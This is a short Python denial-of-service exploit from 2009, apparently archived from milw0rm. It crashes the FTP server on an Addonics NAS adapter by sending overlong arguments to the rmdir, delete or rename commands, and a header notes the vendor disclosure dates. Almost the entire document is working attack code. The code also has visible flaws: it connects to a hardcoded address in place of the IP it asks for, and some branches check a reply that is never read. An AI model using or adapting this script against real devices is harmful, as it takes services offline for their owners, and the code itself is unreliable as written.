<html><head><title>Addonics NAS Adapter FTP Remote Denial of Service Exploit</title></head><pre>#!/usr/bin/python
######################################################
# Addonics NAS Adapter FTP server DoS
# Tested against NASU2FW41 Loader 1.17
# Coded by Mike Cyr, aka h00die
# mcyr2     at           csc         dot_____________com
# Notes: Since the HTTP server was so vulnerable, is
#        this really a suprise?
# Greetz to muts and loganWHD, I tried harder
# http://www.offensive-security.com/offsec101.php turning script kiddies into ninjas daily
# Log: Vendor notification March 25, 2009
#      Vendor response March 26, 2009
#	   Milw0rm release May 1, 2009
######################################################

import socket
import sys

buffer= 'a'
counter=1

ip = raw_input(&quot;IP: &quot;)
un = raw_input(&quot;Username: &quot;)
password = raw_input(&quot;Password: &quot;)

print &quot;Vulnerable commands&quot;
print &quot;1. rmdir&quot;
print &quot;2. delete&quot;
print &quot;3. rename&quot;
command = raw_input(&quot;Command to crash (#): &quot;)

if command == &quot;1&quot;:
	print &quot;fuzzing &quot; + ip + &quot; with command rmdir&quot;
elif command == &quot;2&quot;:
	print &quot;fuzzing &quot; + ip + &quot; with command delete&quot;
elif command == &quot;3&quot;:
	print &quot;fuzzing &quot; + ip + &quot; with command rename&quot;
else:
	print &quot;your an idiot&quot;
	sys.exit(1)

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('192.168.2.101',21))
print s.recv(1024)
s.send('USER ' + un + '\r\n')
print s.recv(1024)
s.send('PASS ' + password + '\r\n')
print s.recv(1024)
if command == &quot;1&quot;:
	while len(buffer) &lt;=512:
		buffer = buffer + 'a'
		counter=counter+1
	s.send('XRMD ' + buffer + '\r\n')
	print 'rmdir ' + buffer + '\r\n'
elif command == &quot;2&quot;:
	while len(buffer) &lt;=523:
		buffer = buffer + 'a'
		counter=counter+1
	s.send('delete ' + buffer + '\r\n')
elif command == &quot;3&quot;:
	while len(buffer) &lt;=526:
		buffer = buffer + 'a'
		counter=counter+1
	s.send('RNFR ' + buffer + '\r\n')
	answer=s.recv(1024)
	s.send('RNTO ' + buffer + '\r\n')
	answer=s.recv(1024)
if (answer == &quot;550 Requested action not taken.\r\n&quot;):
	print &quot;Stack smashed&quot;
else:
	print &quot;fail: &quot; + answer
s.close()

# milw0rm.com [2009-05-01]</pre></html>